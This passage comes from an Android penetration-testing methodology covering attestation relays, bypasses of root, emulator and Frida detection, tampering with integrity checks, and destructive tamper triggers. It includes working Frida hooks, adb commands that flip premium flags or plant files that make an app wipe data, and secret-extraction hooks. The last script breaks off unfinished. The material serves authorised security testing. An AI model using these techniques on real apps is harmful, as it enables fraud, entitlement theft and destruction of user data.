| **Maps to** | Android security-key-attestation documentation — check `attestationSecurityLevel` is `TrustedEnvironment` or `StrongBox`, verify the root "is signed with Google's attestation root key", check the chain against the CRL at `https://android.googleapis.com/attestation/status`, roots listed at `https://android.googleapis.com/attestation/root`, official verifier `github.com/android/keyattestation`; AOSP `SecurityLevel` values `Software` / `TrustedEnvironment` / `StrongBox` |

- **Test:** Two checks are commonly missing: the security level (a *software* attestation chain is
  generable on any emulator) and revocation (leaked keyboxes are revoked by Google, and a backend that
  never checks the CRL keeps accepting them).
- **How:**
```bash
# what level does the captured chain actually claim?
openssl x509 -in leaf.pem -text -noout | grep -A40 '1.3.6.1.4.1.11129.2.1.17' | grep -i 'securityLevel\|Software\|TrustedEnvironment\|StrongBox'
# does the chain terminate in the Software attestation root?
openssl x509 -in root.pem -subject -noout
# does the server consult the status list at all?
curl -s https://android.googleapis.com/attestation/status | head -c 200
```
  Then submit a chain generated on a standard AVD (which terminates in "Android Keystore **Software**
  Attestation Root") to the gated endpoint.
- **Proof:** The backend accepting a software-rooted or revoked chain for an action whose policy requires
  hardware attestation.
- **Escalation:** -> emulator-farm provisioning at scale (D23), -> D12 where the same level check governs
  whether the app's keys are really hardware-backed.
- **Ruled out when:** The software-rooted chain is refused. **False-positive suppression:** never report
  an `attestationSecurityLevel: Software`, `isInsideSecureHardware()==false` or
  `StrongBoxUnavailableException` observed **only on an AVD** as a property of the app — on a standard
  emulator the Keystore is software-backed by construction. Re-run on a physical device before any claim:
```bash
adb shell getprop ro.kernel.qemu; adb shell getprop ro.hardware; adb shell getprop ro.product.model
adb shell pm list features | grep -iE 'strongbox|hardware_keystore'   # absent on a stock AVD
```

### D21-031 · Hardware attestation treated as a device-integrity boolean — the clean-device relay

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 (the attacker runs the modified client and owns a second clean handset) |
| **Applies to** | apps that treat an AndroidKeyStore X.509 attestation chain as a device-integrity boolean |
| **Maps to** | MASTG-KNOW-0044; AOSP key/ID attestation docs; the published key-attestation relay research |

- **Test:** OID `1.3.6.1.4.1.11129.2.1.17` proves that *some* acceptable TEE or StrongBox generated the
  leaf key for `attestationChallenge`. It does **not** bind that hardware to the process or network
  session presenting the chain. Signature validation, Google-root pinning, freshness, revocation,
  security-level, `deviceLocked=true` and `verifiedBootState=Verified` can all pass on relayed evidence,
  because every claim is genuine — for the oracle phone.
- **How:** Instrument the rooted target, capture the backend's raw challenge **before** local key
  generation, and have a stock locked phone generate the key and chain.
```
1. hook the highest-level method that accepts the challenge ByteArray and returns the attestation
   wrapper.  If none exists, hook KeyGenParameterSpec.Builder.setAttestationChallenge(byte[]) on input
   and java.security.KeyStore.getCertificateChain(String) on output, tracking alias and per-request
   context so concurrent generations cannot be mispaired.
2. re-encode the challenge as unpadded Base64URL
   (android.util.Base64  NO_PADDING | NO_WRAP | URL_SAFE  ==  1 | 2 | 8)
3. POST {"nonce":"..."} to the clean phone's helper
4. clean phone: generate an ephemeral secp256r1 AndroidKeyStore signing key, SHA-256,
   .setAttestationChallenge(challenge)  (StrongBox if the backend requires it)
5. export KeyStore.getCertificateChain(alias) as Base64 DER and inject it into the target using the
   EXACT application-specific return type
```
  Two operational rules that decide whether this works: **do not call the original local method** (the
  rooted phone then generates its own failing `RootOfTrust`), and the controller must always post a
  `response` — even an empty array after an HTTP error — or `op.wait()` deadlocks the app thread.
- **Proof:** The backend accepting an attestation chain generated on a different, clean device while the
  app runs on a rooted one, with the gated action completing.
- **Escalation:** -> D13/D23. The fix to recommend is specific: require a signature over fresh **session-,
  challenge- and transaction-specific** data, which forces the attacker to proxy every signing operation
  rather than only the initial chain; and parse `attestationApplicationId` (authorization tag **[709]**),
  comparing package name and SHA-256 signing-certificate digest against independently configured values.
- **Ruled out when:** The backend requires a signature from the attested key over per-transaction data, so
  a one-shot chain relay yields nothing — or the app pins the attested key to the session such that a
  chain generated elsewhere fails at the first signed request. State which of the two mechanisms you
  observed.

### D21-032 · Verified Boot state read from a system property instead of from attestation

| | |
|---|---|
| **Severity ceiling** | High when it gates a server decision; otherwise Support |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 for the consequence |
| **Applies to** | all |
| **Maps to** | AOSP security-model paper §4.7 (the Verified Boot state "is included in key attestation certificates (provided by Keymint/Strongbox) in the `deviceLocked` and `verifiedBootState` fields, which can be verified by apps as well as passed onto backend services"); AOSP verified-boot device-state documentation (LOCKED vs UNLOCKED, `fastboot flashing [unlock\|lock]` wiping data) |

- **Test:** An app reading `ro.boot.verifiedbootstate` or `ro.boot.flash.locked` to decide device
  integrity is asking the very OS an attacker controls. The supported source is the `RootOfTrust` block
  inside a server-verified key attestation.
- **How:**
```bash
grep -rnE 'SystemProperties|getprop|ro\.boot\.|ro\.debuggable|ro\.secure|Build\.TAGS|test-keys' sources/
adb shell getprop ro.boot.verifiedbootstate
adb shell getprop ro.boot.flash.locked
```
  Override the property (Magisk `resetprop`, or a hook on `SystemProperties.get`) and re-run the flow:
```javascript
Java.perform(function () {
  var SP = Java.use('android.os.SystemProperties');
  SP.get.overload('java.lang.String').implementation = function (k) {
    if (k.indexOf('verifiedbootstate') !== -1) return 'green';
    if (k.indexOf('flash.locked') !== -1) return '1';
    return this.get(k);
  };
});
```
- **Proof:** The app reporting a locked/verified device after the property was overridden, **and** the
  server accepting that report. The second half is the finding; the first half alone is P5.
- **Escalation:** -> D21-013 (this is a special case of a client-asserted verdict) and -> D15.
- **Ruled out when:** No property read feeds a security decision — the greps hit only analytics or
  crash-reporting code — or the app derives boot state from an attestation chain the server verifies.
  Note for the report: boot-state colour semantics are YELLOW = LOCKED with a custom root of trust,
  ORANGE = UNLOCKED, RED = dm-verity corruption or no valid OS.

### D21-033 · Root/emulator/Frida detection that gates a security decision — rate what the bypass unlocked

| | |
|---|---|
| **Severity ceiling** | High — rated on the unlocked capability, **never on the bypass itself**; Critical only where it gates money movement |
| **VRT** | `lack_of_binary_hardening\|lack_of_jailbreak_detection` (**P5**) for the bypass; file the *consequence* under `broken_access_control\|privilege_escalation` (**VARIES**) or the relevant D11/D12/D13/D15 node |
| **Attacker** | AM-12 for the bypass — which is why the bypass is never the finding; AM-01/AM-05 for whatever it reaches |
| **Applies to** | all apps shipping root/emulator/hook detection |
| **Maps to** | MASTG-TEST-0324, MASTG-TEST-0325, MASTG-TEST-0351, MASTG-TECH-0144, MASWE-0051 (CWE-1326), MASWE-0053, MASTG-KNOW-0027, MASTG-KNOW-0031, MASTG-TOOL-0029/-0038 (objection), MASTG-TOOL-0146 (RootBeer), MASTG-TOOL-0021 (Magisk), MASTG-TOOL-0149 (LSPosed), rule `mastg-android-root-detection`; ATT&CK T1633.001, T1630.003 |

- **Test:** Locate the check, establish **what it gates**, bypass it, then demonstrate the delta in the
  thing it gated. If flipping the boolean only changes a local UI warning, the answer is "informational"
  and you write that sentence.
- **How:** First, trace the verdict to its decision point — this is the step people skip:
```bash
grep -rnE 'isRooted|isDeviceRooted|isJailBroken|RootTools\.isAccessGiven|checkRoot|RootBeer' sources/ -B6 -A10
grep -rn 'isRooted()' sources/ -A15 | grep -nE 'finish\(\)|return|unlock|decrypt|allow|skip|setPinning|entitle'
```
  Then the bypass ladder, cheapest first:
```bash
# 0. objection - covers the standard path list and the whole RootBeer surface
objection -g com.target.app explore --startup-command 'android root disable --quiet'
# 1. Magisk: Zygisk on, DenyList on, package added, reboot;  then Shamiko
# 2. drop-in scripts
frida --codeshare dzonerzy/fridantiroot -f com.target.app
frida --codeshare fdciabdul/frida-multiple-bypass -f com.target.app
# 3. targeted, from the D21-004 inventory - preferred, because it cannot cause its own crashes
```
```javascript
Java.perform(function () {
  ['com.scottyab.rootbeer.RootBeer','com.target.security.RootCheck'].forEach(function (cn) {
    try { var C = Java.use(cn);
      C.class.getDeclaredMethods().forEach(function (m) {
        var n = m.getName();
        if (/root|emulator|debug|frida|tamper|hook/i.test(n)) {
          try { C[n].implementation = function () { console.log('[rasp] ' + cn + '.' + n + ' -> false'); return false; }; } catch (e) {}
        }});
    } catch (e) {}
  });
  var F = Java.use('java.io.File');
  F.exists.implementation = function () {
    var p = this.getAbsolutePath();
    if (/su|magisk|frida|xposed|busybox/i.test(p)) { console.log('[rasp] File.exists bypassed: ' + p); return false; }
    return this.exists();
  };
});
```
  Emulator variant, when the gate is `Build.*`:
```javascript
Java.perform(function () {
  var B = Java.use('android.os.Build');
  B.MODEL.value = 'Pixel 7 Pro'; B.MANUFACTURER.value = 'Google'; B.BRAND.value = 'google';
});
```
  Practical note: if the root prompt persists after hooking, press **back** to exit rather than killing the
  app from Recents, then reopen — the check often does not re-run.
- **Proof:** Two artefacts side by side: the control enforced before the bypass, and the concrete
  privileged outcome after — the vault decrypts, the paid tier activates, pinning goes away, the transfer
  is authorised, **and the server's 200 for that action captured in the proxy**. "The app starts" is not
  the proof.
- **Escalation:** -> D14 (if the app disables pinning on "clean" devices), -> D23 (entitlement/payment),
  -> D12 (if a key release depends on the verdict), -> D11. File the consumer under the domain of the
  thing you reached, with this item as the method.
- **Ruled out when:** The verdict reaches only a UI warning, a log line or an analytics beacon — the
  D21-005 outcome B/C case — or the server re-derives the same decision independently (bypass the client
  and the privileged request is still refused). Both are true negatives; write the one-sentence version
  into the ruled-out register rather than filing the P5.

### D21-034 · Detection that fails open — make it throw rather than bypassing it

| | |
|---|---|
| **Severity ceiling** | High — rated on what the check gated; Support where the gate is client-side UI only |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) where a server decision or key release depends on it |
| **Attacker** | AM-12 for the mechanism; AM-01 where an induced error is remotely reachable |
| **Applies to** | all |
| **Maps to** | MASWE-0051, MASVS-RESILIENCE-1; AOSP security-model paper §3 rule ③ (rooting is "modifying the system to allow starting processes that are not subject to sandboxing and isolation" — a CDD non-compliance, and attestation rather than a local check is the supported mechanism) |

- **Test:** This is a different, better test than bypassing. Detection routines wrapped in a broad
  `try/catch` that swallows the exception, or run on a background thread whose result is never awaited,
  fail open on their own — no attacker tooling needed, and it is a defect the vendor can actually fix.
- **How:**
```bash
grep -rn -A15 'isRooted\|checkRoot\|detectTamper\|verifySignature\|isEmulator' sources/ \
  | grep -nE 'catch \(|return false;|return true;|Thread\(|executor|async'
```
  Then make the check *throw* and watch the app's path:
```javascript
Java.perform(function () {
  var C = Java.use('com.target.app.security.RootCheck');
  C.isDeviceRooted.implementation = function () {
    throw Java.use('java.lang.RuntimeException').$new('induced');
  };
});
```
- **Proof:** The app proceeding to the protected flow after the detection threw — logcat shows the
  exception, the screen shows the protected state, and (the half that matters) the server accepts the
  subsequent request.
- **Escalation:** -> D21-013 where the swallowed result is what the client reports to the server;
  -> D12 where a key release is conditioned on it.
- **Ruled out when:** The induced exception causes the app to refuse the flow (fail closed), or the
  protected resource stays encrypted because it is bound to a Keystore key rather than to the boolean. If
  the gate is purely a client-side UI warning, this is informational — say so and do not file it.

### D21-035 · Detection verdict cached in a backed-up, attacker-writable file

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**); the backup path itself is `mobile_security_misconfiguration\|auto_backup_allowed_by_default` (**P5**) and is not the headline |
| **Attacker** | AM-11 physical unlocked / AM-03 where a backup transport is reachable — materially weaker preconditions than "root plus Frida" |
| **Applies to** | apps with `allowBackup` effectively true, or any on-disk cache of the verdict |
| **Maps to** | MASWE-0006, MASWE-0051, MASWE-0057 (CWE-471 "Modification of Assumed-Immutable Data") |

- **Test:** A detection result cached in SharedPreferences (`"is_rooted":false`, `"integrity_ok":true`,
  `"tamper_strikes":0`) that is included in backup and read on next launch is defeated by the restore
  primitive — no runtime hooking at all. That is a materially different finding from "the check can be
  hooked", and it is why it is worth its own item.
- **How:**
```bash
grep -rnE 'is_rooted|rooted|tamper|integrity_ok|jailbreak|emulator|strike|last_verdict' sources/ \
  | grep -i 'preference\|putBoolean\|getBoolean\|putString\|edit()'
# confirm it is in the backup set
adb shell bmgr transport com.android.localtransport/.LocalTransport
adb shell bmgr backupnow com.target.app && adb shell dumpsys backup | grep -i target
# or, on a debuggable/dev build, straight through run-as
adb shell run-as com.target.app cat shared_prefs/security.xml
```
- **Proof:** Restore a modified value and show the app taking the "clean device" path on a device that
  fails its own live check — with the modified XML and the resulting app state side by side.
- **Escalation:** -> D11 (the restore primitive itself), -> D21-013 if the cached verdict is what the
  client then reports to the server, -> D23.
- **Ruled out when:** The verdict is recomputed every launch and never persisted, or the cached value is
  HMAC'd with a Keystore-held key so a tampered file is rejected. Show the rejection.

### D21-036 · Security-relevant local state consumed without an integrity check

| | |
|---|---|
| **Severity ceiling** | Critical when the flipped flag causes the **server** to grant an entitlement; Medium for a purely local unlock |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**); `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|identity_check_value` (**P4**) as the integrity-primitive framing |
| **Attacker** | AM-11 / AM-12 locally; AM-01 once the server honours it |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0338, MASTG-TECH-0008, MASWE-0057 (CWE-471), MASTG-KNOW-0036, MASTG-BEST-0066, MASVS-RESILIENCE-2, MASVS-CODE-4 |

- **Test:** The R-profile test that produces genuine findings, because its failure condition is
  behavioural rather than "measure X is absent": the app "uses data loaded from local storage
  (SharedPreferences, files, or databases) in a security-relevant decision without verifying its
  integrity".
- **How:**
```bash
# 1. find the security-relevant local reads
grep -rnE 'getSharedPreferences|getBoolean\(|getString\(|getInt\(' sources/ \
  | grep -iE 'premium|pro|subscri|entitle|licen|trial|unlock|feature|role|admin|verified|attempts|limit|quota'
# 2. is any integrity primitive guarding them?
grep -rnE 'javax\.crypto\.Mac|Mac\.getInstance|java\.security\.Signature|MessageDigest\.getInstance|MessageDigest\.isEqual' sources/
# 3. flip it and relaunch
adb root
adb shell "sed -i 's/\"is_premium\" value=\"false\"/\"is_premium\" value=\"true\"/' /data/data/com.target.app/shared_prefs/settings.xml"
adb shell am force-stop com.target.app; adb shell monkey -p com.target.app 1
```
- **Proof:** The app honouring the modified value — a paid feature unlocked, a trial counter reset, an
  attempt limiter bypassed — and, critically, **the backend also honouring it** where the flag drives a
  server call. The second half is what separates Medium from Critical.
- **Escalation:** -> D23 (revenue/entitlement), -> D15 (where the flag becomes a request field), -> D13
  (where the counter is a lockout counter).
- **Ruled out when:** Every security-relevant value is HMAC- or signature-verified on read and a tampered
  value is rejected. **Beware the false positive the test itself warns about** (`false_negative_prone:
  true`): `Mac`, `Signature` and `MessageDigest` are routinely used for networking, analytics and generic
  checksums, so their mere presence does not prove a storage-integrity mechanism — confirm by tampering
  and observing the rejection, not by grep.

### D21-037 · Self-signature / installer check that neither fails closed nor covers what executes

| | |
|---|---|
| **Severity ceiling** | Medium as a broken-control finding; do not inflate |
| **VRT** | `lack_of_binary_hardening\|lack_of_exploit_mitigations` (**P5**) for the absence; `cryptographic_weakness\|insufficient_verification_of_data_authenticity\|cryptographic_signature` (**VARIES**) where the check is the integrity control the vendor claims |
| **Attacker** | AM-12 |
| **Applies to** | all; cross-platform builds where the check lives in JS/Dart/C# are the weakest case |
| **Maps to** | MASWE-0058 (Runtime Code Integrity Not Verified), MASTG-KNOW-0032 (Runtime Integrity Verification), MASTG-TOOL-0103 (uber-apk-signer), MASTG-TECH-0039 |

- **Test:** Apps that check their own signature at runtime read `PackageManager` data that an instrumented
  process controls — and in any case the executed code is the ART artefact (`.odex`/`.vdex`), not the APK.
  Demonstrate the gap rather than describing it.
- **How:**
```bash
grep -RnE 'getPackageInfo\(.*GET_SIGN|hasSigningCertificate|getApkContentsSigners|signingInfo|CRC|checksum|verifyApk|getInstallerPackageName|getInstallSourceInfo' -A8 sources/
# cross-platform layers, where the check is trivially patchable
grep -a -nE 'getInstallerPackageName|signatures|signingInfo|PackageManager' hbc.strings 2>/dev/null | head
grep -nE 'GetInstallerPackageName|signatures|PackageInfo' out/dump.cs 2>/dev/null | head
```
```javascript
Java.perform(function () {
  var PM = Java.use('android.app.ApplicationPackageManager');
  PM.getPackageInfo.overload('java.lang.String','int').implementation = function (p, f) {
    console.log('getPackageInfo(' + p + ',' + f + ')');
    return this.getPackageInfo(p, f);
  };
});
```
- **Proof:** The check reporting "intact" while your injected code is demonstrably running in-process —
  a log line from your own class in the same logcat capture as the check's success message.
- **Escalation:** Supports the rating for D17 (repackaging/supply chain) and D02. Alone it is bounded:
  a repackaged app only matters if it can attack *other* users, i.e. through a distribution channel you
  can poison.
- **Ruled out when:** The signature check runs natively, fails closed, and is re-evaluated during the
  session rather than only at launch — or the app performs no self-check at all, in which case there is no
  broken control to report (the absence is P5).

### D21-038 · RASP initialised after an attacker-controlled library is already mapped

| | |
|---|---|
| **Severity ceiling** | High when combined with a write primitive |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**); rate through the D17 finding it enables |
| **Attacker** | AM-03/AM-08 where the writable path is reachable by another app or an SDK |
| **Applies to** | apps with integrity or attestation claims |
| **Maps to** | MASWE-0058; the Dirty Stream research pattern (the vendor hash check was defeated by overwriting the stored reference hash — the check ran against attacker-controlled reference data) |

- **Test:** Ordering matters. If any attacker-writable `.so`, DEX or reference hash resolves *before* the
  integrity check runs, the check is already compromised and its verdict is meaningless.
- **How:**
```bash
frida-trace -U -f com.target.app -j 'java.lang.System!load*' -j 'dalvik.system.*ClassLoader!$init'
adb shell "cat /proc/$(adb shell pidof com.target.app)/maps" | grep -vE '/system|/apex|/data/app/.*base\.apk'
# where does the reference hash live, and who can write it?
grep -rnE 'MessageDigest|sha256|checksum|expectedHash|EXPECTED_' sources/ -A6 | grep -iE 'getExternalFilesDir|getFilesDir|openFileOutput|File\('
ls -l /sdcard/Android/data/com.target.app/files 2>/dev/null
```
- **Proof:** A module in `/proc/<pid>/maps` that comes from neither the APK nor the platform, mapped
  before the integrity routine's own module — or a reference hash stored in an attacker-writable location,
  overwritten, and the check subsequently passing on modified content.
- **Escalation:** -> D17 (this is the reason supply-chain and dynamic-code-loading findings survive
  despite RASP), -> D07 where the writable path is a shared/provider-reachable location.
- **Ruled out when:** The integrity routine is the first native library loaded, the reference hash is
  compiled in or Keystore-signed, and nothing outside the APK and the platform appears in the process
  map. Paste the filtered `maps` output as the negative.

### D21-039 · Destructive or lockout tamper response that an attacker can trigger

| | |
|---|---|
| **Severity ceiling** | **Critical** where the trigger is plantable by another app |
| **VRT** | `application_level_denial_of_service_dos\|critical_impact_and_or_easy_difficulty` (**P2**), or `\|high_impact_and_or_medium_difficulty` (**P3**) |
| **Attacker** | AM-03 zero-permission local app where the trigger is a file on shared storage; AM-01 where the trigger is a server-influenced signal |
| **Applies to** | all apps with a destructive tamper response |
| **Maps to** | ATT&CK T1662 Data Destruction, T1630.002 File Deletion (`wipeData`), T1629.002 Device Lockout (`DevicePolicyManager.lockNow()`), T1642 Endpoint Denial of Service, T1471 Data Encrypted for Impact |

- **Test:** Nobody checks this, and it is the one item in the chapter with a Critical ceiling. Does the
  app's tamper response wipe data, log the account out permanently, lock the device or block the account —
  and can that response be triggered by an attacker or by a plausible false positive?
- **How:**
```bash
grep -rn -i -B8 'wipeData\|lockNow\|clearApplicationUserData\|System\.exit\|Process\.killProcess\|deleteDatabase\|logout\(\)\|blockAccount\|invalidateSession' sources/ \
  | grep -n -i 'root\|tamper\|integrity\|hook\|emulator\|debug\|frida\|magisk'
```
  Then find the cheapest artificial trigger and use it. The high-value case is a detection that looks for
  a *path* rather than an executable:
```bash
# if the check is File("/sdcard/…/magisk").exists() or similar, any app can plant it
adb shell run-as com.attacker 'mkdir -p /sdcard/Download && touch /sdcard/Download/magisk'
adb shell am force-stop com.target.app; adb shell monkey -p com.target.app 1
adb shell run-as com.target.app ls -la files shared_prefs databases   # before and after
```
- **Proof:** The app wiping user data, locking the account or force-logging-out after a benign file was
  planted by a second app — with a directory listing before and after, and the five-screenshot state-change
  set (pre-state, the trigger, negative post-state, positive post-state, the side effect such as a
  "your account was locked" email).
- **Escalation:** If the trigger file can be planted by any app on shared storage, **any app on the device
  can destroy the client's users' data** — that is the Critical framing, and it belongs under
  application-level DoS, not under resilience. -> D11 (what was destroyed), -> D07 if the trigger path is
  provider-reachable.
- **Ruled out when:** The tamper response is non-destructive (refuse the flow, show a warning, exit
  cleanly) or its trigger is not reachable by another app — the checked paths are inside the app sandbox,
  or the response requires a server confirmation. Name the response and the trigger reachability in the
  negative.

### D21-040 · The app weakens the device's or the user's own security posture

| | |
|---|---|
| **Severity ceiling** | High — the app lowers the whole device's baseline; Medium where it is only a battery-optimisation request |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) where it reaches a privileged state; otherwise argue on the platform-protection removed |
| **Attacker** | AM-02 remote one click (the user is talked through it) |
| **Applies to** | all |
| **Maps to** | ATT&CK T1629.003 Disable or Modify Tools, T1629 Impair Defenses (detection DET0687, correlating "application-driven security modifications, degraded defensive telemetry, and continued activity under reduced monitoring"), T1632.001 |

- **Test:** The inverse of the rest of this chapter. Does the app *reduce* a platform protection to make
  itself work — disable Play Protect, request battery-optimisation exemption plus device admin, relax
  SELinux on a rooted device, instruct the user to sideload, or tell the user to turn off a security
  setting?
- **How:**
```bash
grep -rn -i 'REQUEST_IGNORE_BATTERY_OPTIMIZATIONS\|ACTION_REQUEST_IGNORE_BATTERY\|setenforce\|SELinux\|disableProtect\|play protect\|verify_apps\|package_verifier_enable\|Settings\.Global\.putInt\|unknown sources\|INSTALL_NON_MARKET' sources/ res/
adb shell settings get global package_verifier_enable
adb shell settings get global install_non_market_apps
```
- **Proof:** The code path or the on-screen instruction that reduces a platform protection, captured as
  screen text, plus the settings value before and after.
- **Escalation:** Combined with a sideload-install flow (D02) this is the "the app teaches its users to be
  compromisable" chain, and it is the precondition that makes every phishing/clone finding (D21-041, D09)
  more likely to land.
- **Ruled out when:** The app requests no such change and its onboarding contains no instruction to
  disable a protection. Record the settings values as unchanged after a full onboarding run.

### D21-041 · App-level virtualization / cloning not detected — the sandbox has already collapsed

| | |
|---|---|
| **Severity ceiling** | High as an app-side resilience finding for banking, wallet and DRM apps |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-02 (the user installs the container), AM-08 (the container is the hostile party) |
| **Applies to** | banking, wallet and DRM apps; any app whose threat model assumes per-package UID isolation |
| **Maps to** | MASWE-0058; the dex-load primitive `DexFile.openDexFile()` -> `openDexFileNative()` that containers hook and redirect |

- **Test:** Container and cloning frameworks run the target inside a host process. Where the guest executes
  under the host UID, per-package UID isolation is gone and the guest inherits **all host-granted
  permissions** even where its own manifest declares none. Verify per container rather than assuming.
- **How:**
```bash
adb shell "cat /proc/<pid>/maps | grep base.apk"     # multiple unrelated base.apk in one PID = container
adb shell "cat /proc/<pid>/maps | grep frida"
adb shell "file /data/app/*/lib/arm64/libfrida-gadget.so" 2>/dev/null
adb shell dumpsys package com.target.app | grep -i 'userId=\|pkgFlags'
```
  Crash-tamper probe: trigger a deliberate exception (an NPE in a reachable path) and observe whether the
  process dies normally — hosts that intercept lifecycle and crash paths may swallow or rewrite crashes,
  which is itself the tell.
- **Proof:** Several APKs mapped in one PID, and the target app functioning with permissions it never
  requested — shown by exercising a permission-gated feature after checking the target's own manifest
  does not declare it.
- **Escalation:** -> D11/D12 (every storage and key control in the app is now reachable by the host),
  -> D03 (permission inheritance).
- **Ruled out when:** The app detects the cloned/containerised execution and refuses, or the app's threat
  model does not depend on UID isolation. Recommend the honest framing in the report: server-side
  attestation is **one** risk signal to combine with account and transaction controls, not proof that no
  runtime instrumentation exists; AVF provides materially stronger isolation than an app container sharing
  a UID.

### D21-042 · MitM-detection that reads only the legacy CA path, blind to the Conscrypt APEX

| | |
|---|---|
| **Severity ceiling** | High for an app that markets MitM detection as a control (bank/fintech) |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**) where the detection gates a flow; otherwise Support |
| **Attacker** | AM-07 for the mechanism (tester convenience, not an attacker) — so the finding is the **false claim**, not the interception |
| **Applies to** | **API 34+**: the live trust store moved to the Conscrypt APEX at `/apex/com.android.conscrypt/cacerts`; `/system/etc/security/cacerts` is ignored at runtime |
| **Maps to** | AOSP Conscrypt modular-system documentation (dual location, Android 14+); MASWE-0058 |

- **Test:** RASP implementations commonly detect "MITM in progress" by hashing
  `/system/etc/security/cacerts`. On Android 14+ the runtime trust store is also — and in practice
  primarily — in the Conscrypt APEX, so a detector reading only the legacy path is blind to a CA installed
  there, and vice versa.
- **How:**
```bash
frida-trace -U -f com.target.app -j '*!*cacert*' -j '*!*trust*' -j '*!*TrustManager*'
strace -f -e trace=file -p $(adb shell pidof com.target.app) 2>&1 | grep -i cacerts
adb shell ls /apex/com.android.conscrypt/cacerts | head
adb shell ls /system/etc/security/cacerts | head
```
- **Proof:** File-access traces showing only one of the two paths being read, while interception succeeds
  through the other — plus the vendor's own claim that the app detects interception.
- **Escalation:** -> D14 (the interception itself and whatever it reveals). The D21 half is narrow and
  specific: a purchased detection control has a documented blind spot on current Android.
- **Ruled out when:** Both paths are read, or the app performs no interception detection at all (in which
  case there is no control to report — absence is P5). On API < 34 the legacy path alone is correct
  behaviour; mark the API gate explicitly.

### D21-043 · The RASP SDK's own native component is the vulnerable dependency

| | |
|---|---|
| **Severity ceiling** | Critical — per the embedded library's advisory, and only with a reachability proof |
| **VRT** | `using_components_with_known_vulnerabilities\|outdated_software_version` (**P5**) for the version string alone — you must reach the code path to rate it higher |
| **Attacker** | AM-08 malicious third-party SDK / AM-09 where the vulnerable parser consumes remote data |
| **Applies to** | apps with commercial RASP |
| **Maps to** | D16 for the version ranges and the reachability proof; MASTG-TOOL-0009 (APKiD) for vendor fingerprinting |

- **Test:** Security SDKs are dependencies too. Fingerprint the RASP vendor's `.so` and check whether the
  protection layer itself ships an unpatched parser, an outdated embedded library, or an exported
  component.
- **How:**
```bash
unzip -o target.apk 'lib/*' -d x
for so in x/lib/*/*.so; do
  strings -a "$so" | grep -aoiE 'guardsquare|dexguard|appdome|promon|shield|verimatrix|talsec|freerasp' \
    | head -1 | sed "s#^#$so: #"
done
strings -a x/lib/*/*.so | grep -aoE 'OpenSSL 1\.[0-9]\.[0-9][a-z]?|zlib [0-9.]+|curl/[0-9.]+' | sort -u
# does the SDK declare components of its own?
aapt2 dump xmltree target.apk --file AndroidManifest.xml | grep -iA6 -E 'provider|receiver|service' | grep -i -E 'talsec|promon|appdome|guard'
```
- **Proof:** A vendor-attributable `.so` carrying an outdated embedded library version string, **plus** a
  reachable path into it — a version string on its own is P5 under
  `using_components_with_known_vulnerabilities|outdated_software_version`.
- **Escalation:** -> D16 (memory safety, with the reachability proof), -> D17 (supply chain). The narrative
  that makes it land is "the security control is the vulnerable component".
- **Ruled out when:** No vendor RASP `.so` is present, or the embedded library versions are current, or
  the vulnerable routine is not reachable from any app-controlled input. Reachability is the gate — say
  which of the three applies.

### D21-044 · The SDK gates its own behaviour on proxy/VPN/debugger — your evidence is being suppressed

| | |
|---|---|
| **Severity ceiling** | Support (a methodology control that prevents a false negative) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | all dynamic SDK testing |
| **Maps to** | the SourMint research pattern (`ParseAndLoad` checking the Wi-Fi proxy and VPN client; the iOS analogue checking simulator, debugger, jailbreak paths and the system proxy settings) |

- **Test:** Before concluding "the SDK does nothing interesting", verify the SDK is not gating on your
  presence. A component that checks for a proxy, a VPN or a debugger and then behaves differently has
  made your entire dynamic result invalid, in the direction of a false negative.
- **How:**
```bash
grep -rn -i 'getDefaultHost\|http_proxy\|ProxySelector\|VpnService\|NetworkCapabilities.TRANSPORT_VPN\|isDebuggerConnected' sources/
adb shell settings list global | grep -i http_proxy
```
  Run the same flow twice and diff the request sets:
```
run A: explicit device proxy set to the host      -> SDK sees a proxy
run B: transparent interception (no proxy settings set; redirect at the gateway/tun)
```
- **Proof:** A request set that appears under transparent interception and not under explicit-proxy
  interception — the diff of the two flow lists is the artefact.
- **Escalation:** -> D17/D18 (the behaviour the SDK hides when it thinks it is being watched is the actual
  finding), -> D20 where the hidden traffic carries identifiers.
- **Ruled out when:** The two runs produce identical destination and request sets. Paste the two sorted
  host lists; "I only tested with a proxy" is not a negative.

### D21-045 · Hook detection absent — extract the secret and report the secret

| | |
|---|---|
| **Severity ceiling** | Critical — the extracted material's severity, where the token grants off-device account access; Low where the extraction is local-only |
| **VRT** | `lack_of_binary_hardening\|runtime_instrumentation_based` (**P5**) for the missing detection — never the headline; file the extracted secret under its own node |
| **Attacker** | AM-12 for the extraction; the finding only exists once D21-002 condition 2 or 6 converts it to AM-01/AM-05 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0341 (source of the API list below), MASWE-0058, MASTG-KNOW-0030, MASTG-KNOW-0032, MASTG-KNOW-0118, MASTG-BEST-0041, MASTG-TECH-0043, MASTG-TOOL-0001; ATT&CK T1617 Hooking (M1002, M1010) |

- **Test:** Hook the APIs that handle secrets. If the hooks fire and return data, the app has no runtime
  integrity verification — and, more importantly, you now hold the secrets. The finding is the secret.
- **How:** MASTG-TEST-0341 names the high-value targets and what each yields:
```
AccountManager.getPassword() / getAuthToken()  -> auth tokens, OAuth tokens, stored account passwords
KeyStore.getKey() / getCertificate()           -> cryptographic keys and certificates
Cipher.doFinal()                               -> ephemeral/session keys and plaintext
SQLiteDatabase.rawQuery() / query() / execSQL()-> database contents
EncryptedSharedPreferences APIs                -> the decrypted values
KeyGenParameterSpec.Builder.setUserAuthenticationRequired()  -> authentication bypass
```
```bash
frida -U -n com.target.app -l - <<'JS'
Java.perform(function(){
  try { var AM = Java.use('android.accounts.AccountManager');
